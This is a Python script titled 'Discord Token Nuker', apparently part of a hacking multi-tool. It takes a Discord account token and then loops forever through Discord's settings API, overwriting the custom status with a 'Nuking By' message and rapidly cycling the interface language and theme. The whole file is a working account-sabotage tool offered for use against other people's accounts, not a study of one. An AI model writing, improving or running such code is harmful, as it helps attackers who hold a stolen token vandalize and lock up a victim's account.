from Config.Util import *
from Config.Config import *
import requests
import time
import requests
import time
from itertools import cycle
import random

Title("Discord Token Nuker")


token = input(f"{color.RED}\n[?] | Token -> {color.RESET}")

headers = {'Authorization': token, 'Content-Type': 'application/json'}
r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
if r.status_code == 200:
    ()
else:
    ErrorToken()

default_status = f"Nuking By {github_tool}"
custom_status = input(f"{color.RED}[?] | Enter Custom Status -> {color.RESET}")
statues = [default_status]
custom_status = f"{custom_status} | Red Tiger"
      
modes = cycle(["light", "dark"])


while True:

    CustomStatus_default = {"custom_status": {"text": default_status}}
    try:
        r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
        print(f"{color.RED}[+] | Status Changed | \"{color.WHITE}{default_status}{color.RED}\"")
    except Exception as e:
        print(f"{color.RED}[X] | Error | \"{color.WHITE}{e}{color.RED}\"")

    for _ in range(5):

        random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
        setting = {'locale': random_language}
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
        print(f"{color.RED}[+] | Language Changed | \"{color.WHITE}{random_language}{color.RED}\"")
    
        theme = next(modes)
        setting = {'theme': theme}
        requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
        print(f"{color.RED}[+] | Theme Changed | \"{color.WHITE}{theme}{color.RED}\"")
        time.sleep(0.6)

    CustomStatus_custom = {"custom_status": {"text": custom_status}}
    try:
        r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_custom)
        print(f"{color.RED}[+] | Status Changed | \"{color.WHITE}{custom_status}{color.RED}\"")
    except Exception as e:
        print(f"{color.RED}[X] | Error | \"{color.WHITE}{e}{color.RED}\"")
    
    for _ in range(5):

        random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
        setting = {'locale': random_language}
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
        print(f"{color.RED}[+] | Language Changed | \"{color.WHITE}{random_language}{color.RED}\"")
    
        theme = next(modes)
        setting = {'theme': theme}
        requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
        print(f"{color.RED}[+] | Theme Changed | \"{color.WHITE}{theme}{color.RED}\"")
        time.sleep(0.6)

